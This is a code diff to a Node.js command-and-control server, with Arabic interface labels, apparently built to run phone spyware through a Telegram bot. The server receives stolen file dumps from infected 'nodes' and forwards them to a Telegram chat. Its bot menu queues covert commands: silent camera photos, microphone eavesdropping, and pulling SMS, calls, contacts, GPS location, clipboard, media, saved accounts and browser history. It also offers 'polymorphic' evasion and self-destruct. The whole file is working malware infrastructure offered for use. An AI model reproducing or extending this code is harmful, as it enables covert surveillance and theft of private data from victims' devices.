@@ -37,7 +37,7 @@ function escapeHtml(s) {
 }
 
 app.get('/', (req, res) => {
-    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v20.0 — Pure JSON [☢️]</h1></body></html>`);
+    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] OMEGA URANIUM C2 v21.0 — Active [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/stream', (req, res) => {
@@ -78,7 +78,7 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         const nodeModel = req.headers['x-node-model'] || 'Unknown';
         const fileName = path.basename(req.headers['x-file-name'] || `dump_${Date.now()}.bin`);
         if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });
-        if (req.body.length > 60 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });
+        if (req.body.length > 80 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });
 
         db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
 
@@ -88,9 +88,9 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         fs.writeFileSync(finalPath, req.body);
 
         const mb = (req.body.length / 1024 / 1024).toFixed(2);
-        await sendTg(`☢️ <b>${escapeHtml(fileName)}</b> (${mb}MB) من <code>${nodeId}</code>`);
+        await sendTg(`☢️ <b>ملف أسطوري مسحوب: ${escapeHtml(fileName)}</b> (${mb}MB) من <code>${nodeId}</code>`);
         try {
-            if (req.body.length <= 45 * 1024 * 1024) {
+            if (req.body.length <= 48 * 1024 * 1024) {
                 await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName} (${mb}MB)` });
             }
         } catch (_) {}
@@ -107,9 +107,9 @@ appBot.on('message', async (msg) => {
 
     if (text === '/start' || text === '/menu') {
         db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 15`, async (err, rows) => {
-            if (!rows || !rows.length) return sendTg('⚠️ لا نودات.');
+            if (!rows || !rows.length) return sendTg('⚠️ لا نودات نشطة حالياً.');
             const kb = rows.map(n => [{ text: `${n.online ? '🟢' : '⚫'} ${n.model} (${n.id.substring(0,8)})`, callback_data: `menu_${n.id}` }]);
-            await sendTg('☢️ <b>v20 — اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
+            await sendTg('☢️ <b>لوحة قيادة الأسطورة — اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
         });
     }
 });
@@ -124,28 +124,31 @@ appBot.on('callback_query', async (query) => {
         const kb = { inline_keyboard: [
             [{ text: '🔦 فلاش ON', callback_data: `cmd_CMD_FLASH_ON_${nodeId}` }, { text: '🔦 فلاش OFF', callback_data: `cmd_CMD_FLASH_OFF_${nodeId}` }],
             [{ text: '📳 اهتزاز', callback_data: `cmd_CMD_VIBRATE_${nodeId}` }, { text: '🔊 تنبيه', callback_data: `cmd_CMD_BEEP_${nodeId}` }],
-            [{ text: '📸 صورة خلفية صامتة', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🤳 صورة أمامية صامتة', callback_data: `cmd_EXTRACT_CAMERA_SNAP_FRONT_${nodeId}` }],
-            [{ text: '🎙️ تنصت 6s', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
-            [{ text: '📨 SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 مكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
-            [{ text: '📇 جهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 تطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
-            [{ text: '📍 GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 حافظة', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
-            [{ text: '🖼️ 20 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 10 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
-            [{ text: '📁 DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` }, { text: '📥 Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }],
-            [{ text: '📊 فحص تخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }, { text: '📶 Wi-Fi', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` }],
-            [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
-            [{ text: '🔙 رجوع', callback_data: 'back_home' }]
+            [{ text: '📸 صورة خلفية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🤳 صورة أمامية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_FRONT_${nodeId}` }],
+            [{ text: '🎙️ تنصت 10s', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
+            [{ text: '📨 سحب كل الـ SMS (Zip)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 سحب المكالمات (Zip)', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
+            [{ text: '📇 سحب جهات الاتصال (Zip)', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
+            [{ text: '📍 موقع GPS الدقيق', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 الحافظة الحالية', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
+            [{ text: '🖼️ سحب 100 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 سحب 30 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
+            [{ text: '📁 ضغط وتحميل DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` }, { text: '📥 ضغط وتحميل Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }],
+            [{ text: '📊 فحص التخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }, { text: '📶 نظام Wi-Fi', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` }],
+            [{ text: '🔑 الحسابات المحفوظة', callback_data: `cmd_EXTRACT_ACCOUNTS_${nodeId}` }, { text: '🌐 سجل المتصفح', callback_data: `cmd_EXTRACT_BROWSER_${nodeId}` }],
+            [{ text: '🔓 إيقاظ الشاشة', callback_data: `cmd_CMD_SCREEN_ON_${nodeId}` }, { text: '🔒 قفل الشاشة', callback_data: `cmd_CMD_SCREEN_OFF_${nodeId}` }],
+            [{ text: '🛡️ طفرة التمويه (Polymorphic)', callback_data: `cmd_POLY_MUTATE_${nodeId}` }],
+            [{ text: '💥 تدمير ذاتي (Self Destruct)', callback_data: `confirm_SELF_${nodeId}` }],
+            [{ text: '🔙 رجوع للقائمة', callback_data: `back_home` }]
         ] };
-        await appBot.editMessageText(`🎯 <b>النود:</b> <code>${nodeId}</code> — v20`, {
+        await appBot.editMessageText(`🎯 <b>التحكم بالنود الأسطوري:</b> <code>${nodeId}</code>`, {
             chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
         });
     }
     else if (data.startsWith('confirm_SELF_')) {
         const nodeId = data.replace('confirm_SELF_', '');
-        await appBot.editMessageText(`⚠️ <b>تأكيد النسف</b> <code>${nodeId}</code>؟`, {
+        await appBot.editMessageText(`⚠️ <b>تأكيد النسف والتدمير الشامل للنود</b> <code>${nodeId}</code>؟`, {
             chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
             reply_markup: { inline_keyboard: [[
-                { text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
-                { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }
+                { text: '✅ نعم، دمر كل شيء', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
+                { text: '❌ إلغاء التدمير', callback_data: `menu_${nodeId}` }
             ]] }
         });
     }
@@ -155,7 +158,7 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
         db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
             [targetNodeId, action, Date.now()], async () => {
-                await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
+                await appBot.answerCallbackQuery(query.id, { text: `☢️ تنفيذ أمر: ${action}` });
             });
     }
     else if (data === 'back_home') {
@@ -164,4 +167,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium C2 v20.0 Pure JSON on :${PORT}`));
+app.listen(PORT, () => console.log(`[+] Omega Uranium C2 Server active on :${PORT}`));
